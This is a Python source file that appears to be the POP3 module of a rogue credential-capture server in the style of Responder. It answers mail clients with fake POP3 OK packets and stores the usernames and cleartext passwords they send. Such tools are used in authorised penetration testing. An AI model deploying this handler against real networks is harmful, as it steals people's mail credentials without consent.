from utils import *
from socketserver import BaseRequestHandler
from packets import POPOKPacket

# POP3 Server class
class POP3(BaseRequestHandler):
	def SendPacketAndRead(self):
		Packet = POPOKPacket()
		self.request.send(str(Packet))
		return self.request.recv(1024)

	def handle(self):
		try:
			data = self.SendPacketAndRead()

			if data[0:4] == "USER":
				User = data[5:].replace("\r\n","")
				data = self.SendPacketAndRead()
			if data[0:4] == "PASS":
				Pass = data[5:].replace("\r\n","")

				SaveToDb({
					'module': 'POP3', 
					'type': 'Cleartext', 
					'client': self.client_address[0], 
					'user': User, 
					'cleartext': Pass, 
					'fullhash': User+":"+Pass,
				})
			self.SendPacketAndRead()
		except Exception:
			pass